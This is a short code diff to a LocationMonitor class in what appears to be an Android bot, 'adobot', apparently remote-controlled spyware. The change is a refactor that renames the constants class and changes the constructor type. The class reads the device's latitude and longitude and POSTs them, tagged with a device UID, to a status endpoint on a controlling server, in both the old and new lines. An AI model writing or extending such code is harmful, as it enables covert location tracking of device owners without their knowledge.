@@ -7,8 +7,7 @@ import android.location.Location;
 import android.support.v4.app.ActivityCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandService;
-import com.android.adobot.Constants;
+import com.android.adobot.AdobotConstants;
 import com.android.adobot.http.Http;
 
 import java.util.HashMap;
@@ -28,7 +27,7 @@ public class LocationMonitor extends BaseTask {
     private double longitude;
     private String server;
 
-    public LocationMonitor(CommandService c) {
+    public LocationMonitor(Context c) {
         setContext(c);
         this.latitude = 0;
         this.longitude = 0;
@@ -70,7 +69,7 @@ public class LocationMonitor extends BaseTask {
             bot.put("lat", latitude);
             bot.put("longi", longitude);
             Http req = new Http();
-            req.setUrl(this.server + Constants.POST_STATUS_URL + "/" + commonParams.getUid());
+            req.setUrl(this.server + AdobotConstants.POST_STATUS_URL + "/" + commonParams.getUid());
             req.setMethod("POST");
             req.setParams(bot);
             req.execute();
